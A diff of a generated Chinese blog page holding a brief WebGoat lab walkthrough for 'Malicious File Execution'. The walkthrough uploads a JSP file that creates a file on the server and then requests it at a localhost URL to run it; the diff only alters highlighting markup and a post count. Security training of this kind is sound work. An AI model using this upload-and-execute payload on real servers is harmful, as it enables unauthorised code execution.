@@ -218,11 +218,11 @@
 
       
         <h1 id="Malicious-File-Execution"><a href="#Malicious-File-Execution" class="headerlink" title="Malicious File Execution"></a>Malicious File Execution</h1><p>先上传一张图片，用开发者工具确定上传图片的路径。</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost:8080/webgoat</span><span class="regexp">/upload/sponge</span>.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/webgoat/u</span>pload<span class="regexp">/sponge.jpg</span></div></pre></td></tr></table></figure>
 <p>然后上传一个恶意jsp(可执行文件，其他环境下可能是 php,asp )</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; &lt;% java.io.<span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> java.io.<span class="keyword">File</span>(<span class="string">"filepath\\guest.txt"</span>); <span class="keyword">file</span>.createNewFile(); %&gt; &lt;<span class="regexp">/HTML&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;HTML&gt; &lt;% java.io.<span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> java.io.<span class="keyword">File</span>(<span class="string">"filepath\\guest.txt"</span>); <span class="keyword">file</span>.createNewFile(); %&gt; &lt;<span class="regexp">/HTML&gt;</span></div></pre></td></tr></table></figure>
 <p>然后访问该地址执行jsp.</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/WebGoat/uploads/yourfile.jsp</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/WebGoat/u</span>ploads<span class="regexp">/yourfile.jsp</span></div></pre></td></tr></table></figure>
 
       
     </div>
@@ -337,7 +337,7 @@
         <div class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">442</span>
+              <span class="site-state-item-count">444</span>
               <span class="site-state-item-name">文章</span>
             </a>
           </div>
